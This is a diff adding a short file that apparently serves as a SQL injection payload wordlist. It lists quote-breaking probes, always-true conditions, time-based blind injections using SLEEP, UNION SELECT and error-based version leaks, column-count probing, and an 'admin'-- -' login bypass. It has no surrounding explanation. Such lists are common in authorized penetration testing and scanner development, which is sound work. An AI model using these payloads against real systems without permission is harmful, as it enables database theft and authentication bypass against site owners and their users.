@@ -1,0 +1,15 @@
+'
+"
+')
+' OR '1'='1
+' OR 1=1-- -
+" OR "1"="1
+' OR SLEEP(5)-- -
+1' AND SLEEP(5)-- -
+' UNION SELECT NULL-- -
+' AND 1=CONVERT(int,@@version)-- -
+1 AND 1=1
+1 AND 1=2
+'||'
+1' ORDER BY 10-- -
+admin'-- -
